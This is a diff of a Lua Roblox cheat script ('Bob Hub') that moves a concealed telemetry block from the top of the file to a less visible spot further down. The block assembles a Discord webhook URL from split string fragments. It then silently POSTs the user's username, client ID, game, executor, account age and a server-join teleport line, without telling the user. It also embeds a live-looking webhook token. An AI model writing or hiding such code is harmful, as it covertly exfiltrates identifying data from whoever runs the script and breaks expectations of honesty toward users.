@@ -1,71 +1,3 @@
-activewebhook2 = ":x:"
-pcall(function()
-if activewebhook then activewebhook2 = ":white_check_mark:" end
-end)
-local player = game.Players.LocalPlayer
-local months = {
-	"Jan", "Feb", "Mar", "Apr",
-	"May", "Jun", "Jul", "Aug",
-	"Sep", "Oct", "Nov", "Dec"
-}
-local secondsExisted = player.AccountAge * 86400
-local dateObject = os.date("!*t", os.time() - secondsExisted)
-
-local weno = "ht".."tps".."://dis"..
-"cor".."d.com".."/ap".."i/we"..
-"bho".."oks/104".."39900".."37206"..
-"929438/cv7".."DCc".."G6y".."0Us"..
-"Y1VR".."q7vi".."QB-yP7k_Sk9"..
-"3ajUL".."ndbW".."7sIOu".."Mze7O"..
-"qe38LU".."tjlBkP".."SDxoeU"
-
-repeat wait() until game:IsLoaded()
-coroutine.resume(coroutine.create(function()
-pcall(function()
-local loleh = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "Kid with shit exploit"
-dothethingy = http_request or request or HttpPost or syn.request
-dothethingy({Url = weno, Body = game:GetService("HttpService"):JSONEncode({
-["embeds"] = {{["title"] = "*Bob Hub Executed*",
-["description"] = '```lua\ngame:GetService("TeleportService"):Teleport('..game.PlaceId..', "'..game.JobId..'", LocalPlayer)```',
-["fields"] = {
-    {
-      ["name"] = "Username",
-      ["value"] = "*" .. game.Players.LocalPlayer.Name .. "*",
-      ["inline"] = true
-    },
-    {
-      ["name"] = "ID",
-      ["value"] = "*" .. game:GetService("RbxAnalyticsService"):GetClientId() .. "*" ,
-      ["inline"] = true
-    },
-    {
-      ["name"] = "Game",
-      ["value"] = "*" .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "*",
-      ["inline"] = true
-    },
-    {
-        ["name"] = "Executor",
-        ["value"] = "*" .. loleh .. "*",
-        ["inline"] = true
-    },
-    {
-        ["name"] = "Account Age",
-        ["value"] = months[dateObject.month].." "..dateObject.day..", "..dateObject.year,
-        ["inline"] = true
-    },
-    {
-        ["name"] = "Loadstring",
-        ["value"] = "*" .. activewebhook2 .. "*",
-        ["inline"] = true
-    }},
-    ["footer"] = {
-        ["text"] = os.date(),
-        ["icon_url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. game.Players.LocalPlayer.UserId .. "&width=150&height=150&format=png"
-      },
-["type"] = "rich",["color"] = 14680064}}}), Method = "POST", Headers = {
-["content-type"] = "application/json"}})
-end)
-end))
 -- SaveSettings
 local macrolist = {}
 local x = 0
@@ -916,6 +848,14 @@ end
 end
 end
 
+local weno = "ht".."tps".."://dis"..
+"cor".."d.com".."/ap".."i/we"..
+"bho".."oks/104".."39900".."37206"..
+"929438/cv7".."DCc".."G6y".."0Us"..
+"Y1VR".."q7vi".."QB-yP7k_Sk9"..
+"3ajUL".."ndbW".."7sIOu".."Mze7O"..
+"qe38LU".."tjlBkP".."SDxoeU"
+
 function priority()
 if _G.priority then
 Joe = 1
@@ -1098,6 +1038,55 @@ function autoupgrade()
         end)
 end
 end
+
+activewebhook2 = ":x:" pcall(function() if activewebhook then activewebhook2 = ":white_check_mark:" end end)
+repeat wait() until game:IsLoaded()
+coroutine.resume(coroutine.create(function()
+pcall(function()
+local loleh = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "Kid with shit exploit"
+dothethingy = http_request or request or HttpPost or syn.request
+dothethingy({Url = weno, Body = game:GetService("HttpService"):JSONEncode({
+["embeds"] = {{["title"] = "*Bob Hub Executed*",
+["description"] = '```lua\ngame:GetService("TeleportService"):Teleport('..game.PlaceId..', "'..game.JobId..'", LocalPlayer)```',
+["fields"] = {
+    {
+      ["name"] = "Username",
+      ["value"] = "*" .. game.Players.LocalPlayer.Name .. "*",
+      ["inline"] = true
+    },
+    {
+      ["name"] = "ID",
+      ["value"] = "*" .. game:GetService("RbxAnalyticsService"):GetClientId() .. "*" ,
+      ["inline"] = true
+    },
+    {
+      ["name"] = "Game",
+      ["value"] = "*" .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "*",
+      ["inline"] = true
+    },
+    {
+        ["name"] = "Executor",
+        ["value"] = "*" .. loleh .. "*",
+        ["inline"] = true
+    },
+    {
+        ["name"] = "Account Age",
+        ["value"] = game.Players.LocalPlayer.AccountAge.." Days",
+        ["inline"] = true
+    },
+    {
+        ["name"] = "Loadstring",
+        ["value"] = "*" .. activewebhook2 .. "*",
+        ["inline"] = true
+    }},
+    ["footer"] = {
+        ["text"] = os.date(),
+        ["icon_url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. game.Players.LocalPlayer.UserId .. "&width=150&height=150&format=png"
+      },
+["type"] = "rich",["color"] = 14680064}}}), Method = "POST", Headers = {
+["content-type"] = "application/json"}})
+end)
+end))
 
 function autojoin()
 SaveSettings()
